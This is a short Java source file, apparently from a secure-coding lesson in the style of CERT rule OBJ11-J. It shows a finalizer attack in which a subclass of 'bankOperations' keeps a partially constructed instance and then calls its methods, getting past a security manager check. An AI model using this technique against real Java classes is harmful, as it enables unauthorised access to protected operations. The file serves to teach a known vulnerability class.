package OBJ11J;

public class interceptor extends bankOperations {
	private static interceptor stealInstance = null;

	public static interceptor get() {
		try {
			new interceptor();
		} catch (Exception ex) {
			/* Ignore exception */}
		try {
			synchronized (interceptor.class) {
				while (stealInstance == null) {
					System.gc();
					interceptor.class.wait(10);
				}
			}
		} catch (InterruptedException ex) {
			return null;
		}
		return stealInstance;
	}

	// attacker's finalizer obtains and stores a reference by using the this
	// keyword.
	public void finalize() {
		synchronized (interceptor.class) {
			stealInstance = this;
			interceptor.class.notify();
		}
		System.out.println("Stole the instance in finalize of " + this);
		// The attacker can now maliciously invoke any instance method
		// on the base class by using the stolen instance reference. This attack
		// can even bypass a check by a security manager.
	}
}